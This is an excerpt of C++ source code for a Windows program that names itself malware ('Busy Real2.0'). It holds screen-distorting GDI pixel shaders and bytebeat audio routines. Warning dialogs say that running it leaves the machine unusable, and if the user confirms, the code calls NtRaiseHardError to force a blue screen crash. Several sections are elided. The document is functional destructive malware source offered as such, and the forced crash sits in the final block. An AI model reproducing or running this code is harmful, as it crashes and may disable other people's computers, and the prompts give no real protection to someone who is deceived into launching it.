...
void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(5, 5, 500));
	}
}
...
void Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		...
		prgbScreen[i].rgb = RGB((r + 100) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(5, 5, 200)) + t * 10;
	}
}
void Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++)
	{
		int randPixel = rand() % 50;
...
void Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		...
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 300) % 256, ((r + g + b) / 10 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(5, 5, 200)) + t * 25;
	}
}
void Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 10) % (RGB(5, 5, 200));
	}
}
...
VOID WINAPI sound1() {
    ...
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t%25)*9)*(t<<t|t>>t));
...
VOID WINAPI sound3() {
    ...
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t%25)*9)*((t*(t>>(t&4096?t*t>>12:t>>12)))|t<<(t>>8)|t>>4));
...
VOID WINAPI sound4() {
    ...
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t%25)*9)*(((t<<1)^((t<<1)+(t>>7)&t>>12))|t>>(4-(1^7&(t>>19)))|t>>7));
...
VOID WINAPI sound5() {
    ...
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t%25)*9)*((t<<1)^((t<<1)+(t>>7)&t>>6))|t>>(4-(1^7&(t>>19)))|t>>7);
...
DO YOU WANT TO EXECUTE THIS (NO SKIDDED) MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Busy Real2.0 (Anti-skiddded)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
...
STILL EXECUTE IT?", L"Busy Real2.0 (Anti-skiddded)", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
			...
			//call bsod
			NtRaiseHardError(0xC0000666, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
